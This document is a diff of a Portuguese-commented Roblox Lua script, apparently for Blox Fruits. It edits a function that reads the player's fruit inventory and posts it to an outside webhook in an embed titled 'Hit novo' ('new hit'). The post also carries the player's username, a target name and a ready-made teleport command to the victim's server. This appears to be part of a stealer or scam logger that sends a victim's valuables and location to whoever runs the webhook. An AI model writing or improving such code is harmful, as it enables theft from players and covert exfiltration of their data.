@@ -213,29 +213,17 @@ local function detectarSea()
     end
 end
 
--- Função para enviar resultados do inventário ao webhook (MÉTODO ORIGINAL)
+-- Função para enviar resultados do inventário ao webhook
 local function enviarInventario()
     local InventoryRemote = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("CommF_")
     local InventoryData = InventoryRemote:InvokeServer("getInventory")
     local fruitsList = ""
     
-    -- Ordem específica das frutas
-    local fruitOrder = {
-        "Dragon", "Kitsune", "Yeti", "Leopard", "Spirit", "Gas", "Control", "Venom",
-        "Dough", "T-rex", "Mammoth", "Gravity", "Blizzard", "Pain", "Rumble", "Portal",
-        "Phoenix", "Sound", "Spider", "Creation", "Love", "Buddha", "Quake", "Magma",
-        "Ghost", "Rubber", "Light", "Diamond", "Eagle", "Dark", "Sand", "Ice", "Flame",
-        "Spike", "Smoke", "Bomb", "Spring", "Blade", "Spin", "Rocket", "Shadow"
-    }
-    
-    -- Verificar frutas na ordem especificada
-    for _, fruitBaseName in ipairs(fruitOrder) do
-        for _, item in pairs(InventoryData) do
-            if item.Type == "Blox Fruit" and item.Name == fruitBaseName then
-                local itemCount = item.Count or 1
-                fruitsList = fruitsList .. string.format("%s-%s - %d\n", fruitBaseName, fruitBaseName, itemCount)
-                break
-            end
+    for _, item in pairs(InventoryData) do
+        if item.Type == "Blox Fruit" then
+            local itemName = item.Name
+            local itemCount = item.Count or 1
+            fruitsList = fruitsList .. string.format("%s - %d\n", itemName, itemCount)
         end
     end
     
@@ -244,10 +232,10 @@ local function enviarInventario()
     end
 
     local seaAtual = detectarSea()
-    local teleportCommand = string.format("```lua\ngame:GetService(\"TeleportService\"):TeleportToPlaceInstance(%s, \"%s\")\n```", placeId, jobId)
+    local teleportCommand = string.format("lua\ngame:GetService(\"TeleportService\"):TeleportToPlaceInstance(%s, \"%s\")\n", placeId, jobId)
     
-    local infoBlock = string.format("```\nUsername: %s\nYou: %s\nSea: %s\n```", LocalPlayer.Name, targetPlayerName, seaAtual)
-    local inventoryBlock = string.format("```\n%s```", fruitsList)
+    local infoBlock = string.format("\nUsername: %s\nYou: %s\nSea: %s\n", LocalPlayer.Name, targetPlayerName, seaAtual)
+    local inventoryBlock = string.format("\n%s", fruitsList)
     
     local requestData = {
         Url = webhookURL,
@@ -260,7 +248,7 @@ local function enviarInventario()
             embeds = {
                 {
                     title = "Hit novo",
-                    color = 16711680,
+                    color = 16711680, -- Vermelho em decimal
                     description = infoBlock .. "\n" .. inventoryBlock,
                     footer = {
                         text = string.format("Place ID: %s | Job ID: %s", placeId, jobId)
